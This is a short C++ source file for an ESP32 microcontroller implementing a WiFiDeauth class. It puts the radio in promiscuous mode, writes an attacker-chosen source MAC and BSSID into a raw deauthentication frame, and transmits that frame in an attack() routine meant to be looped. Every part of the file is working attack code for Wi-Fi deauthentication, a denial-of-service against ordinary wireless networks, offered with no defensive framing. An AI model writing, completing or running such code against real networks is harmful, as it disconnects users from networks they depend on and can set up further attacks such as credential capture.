#include "WiFiDeauth.h"

void WiFiDeauth::setup() {
  WiFi.mode(WIFI_MODE_NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  Serial.println("Deauth ready. Sending packets...");
}

void WiFiDeauth::setTarget(uint8_t* newSourceMAC, uint8_t* newBSSID) {
  memcpy(&deauthPacket[10], newSourceMAC, 6);
  memcpy(&deauthPacket[16], newBSSID, 6);
  Serial.println("MAC and BSSID updated in deauth packet.");
}

void WiFiDeauth::attack(){
  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
  delay(100);
}